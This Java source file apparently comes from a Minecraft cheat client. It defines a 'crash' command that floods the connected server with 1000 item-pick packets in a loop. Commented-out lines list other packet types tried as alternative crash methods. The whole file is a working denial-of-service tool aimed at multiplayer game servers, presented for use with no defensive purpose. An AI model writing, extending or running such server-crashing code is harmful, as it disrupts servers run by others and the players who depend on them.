package io.ace.nordclient.command.commands;

import io.ace.nordclient.command.Command;
import net.minecraft.network.play.client.CPickItemPacket;

public class Crash extends Command {
    @Override
    public String[] getClientAlias() {
        return new String[]{"crash"};
    }

    @Override
    public String getClientSyntax() {
        return "crash";
    }

    @Override
    public void onClientCommand(String command, String[] args) throws Exception {
        for (int i = 0; i < 1000; i++) {
            //needbook//mc.player.connection.sendPacket(new CEditBookPacket(mc.player.getHeldItemMainhand(), true, 100));
            //mc.player.connection.sendPacket(new CUpdateStructureBlockPacket());
            mc.player.connection.sendPacket(new CPickItemPacket(10));
            //mc.player.connection.sendPacket(new CSetDifficultyPacket(Difficulty.PEACEFUL));
            //mc.player.connection.sendPacket(new CQueryTileEntityNBTPacket(1, mc.player.getPosition()));
        }
    }
}
